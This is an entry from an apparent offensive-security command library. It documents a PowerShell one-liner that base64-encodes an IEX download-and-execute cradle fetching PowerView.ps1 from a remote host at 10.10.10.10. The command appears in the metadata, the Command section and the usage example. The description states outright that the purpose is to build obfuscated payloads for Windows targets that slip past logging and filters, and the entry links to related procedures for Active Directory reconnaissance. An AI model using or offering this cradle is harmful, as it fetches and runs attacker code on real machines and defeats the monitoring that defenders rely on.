---
id: f97dc251-d2c0-42b0-80f5-4ec471641d4b
type: command
executor: powershell
data: >-
  $command = 'IEX (New-Object
  Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'; $bytes =
  [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand =
  [Convert]::ToBase64String($bytes); Write-Output $encodedCommand
output: JAB... (base64 string)
created_at: '2023-04-06T03:56:24.012025+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - powershell
  - encoding
verified: true
validated: true
---

# powershell-encode-powerview-download

## Command

```powershell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); Write-Output $encodedCommand
```

## Description

This PowerShell script encodes the command to download and execute PowerView.ps1 from a remote URL into a base64 string using Unicode encoding. Use this to prepare obfuscated payloads for execution on Windows targets to evade logging and filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL in $command | Remote URL hosting PowerView.ps1 (e.g., http://10.10.10.10/PowerView.ps1) | Yes |

## Examples

### Basic Usage

```powershell
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); Write-Output $encodedCommand
```

### Advanced Usage

Modify the URL for HTTPS or different hosts.

## Expected Output

A base64-encoded string like 'JABzAD0AIABOAGUAdAAuAFMAZQBTAEMAbwBiAHAA...' representing the obfuscated command.

## Related

- [[procedures/Download-and-Execute-PowerView-for-AD-Reconnaissance]]
- [[commands/execute-powerview-via-encodedcommand]]
